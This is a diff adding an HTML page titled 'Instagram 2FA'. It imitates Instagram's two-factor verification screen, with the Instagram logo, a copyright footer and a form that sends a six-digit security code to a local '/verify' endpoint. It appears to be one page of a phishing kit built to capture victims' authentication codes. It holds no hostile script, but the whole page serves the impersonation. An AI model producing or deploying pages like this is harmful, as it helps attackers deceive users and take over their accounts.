@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Instagram 2FA</title>
+	<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<div class="wrapper">
+	<div class="header">
+		<div class="top">
+			<div class="logo">
+				<img src="instagram.png" alt="instagram" style="width: 175px;">
+			</div>
+			<div class="form">
+                <p style="text-align: center; margin-bottom: 20px; color: #262626; font-weight: 500;">Enter the 6-digit code we sent to your device.</p>
+				<form action="/verify" method="POST">
+					<div class="input_field">
+						<input type="text" name="code" placeholder="Security Code" class="input" maxlength="6" required>
+					</div>
+					<button type="submit" class="btn">Confirm</button>
+				</form>
+			</div>
+		</div>
+		<div class="signup">
+			<p>Didn't get a code? <a href="#">Resend</a></p>
+		</div>
+	</div>
+	<div class="footer">
+		<div class="copyright" style="width: 100%; text-align: center;">
+			© 2026 INSTAGRAM
+		</div>
+	</div>
+</div>
+
+</body>
+</html>
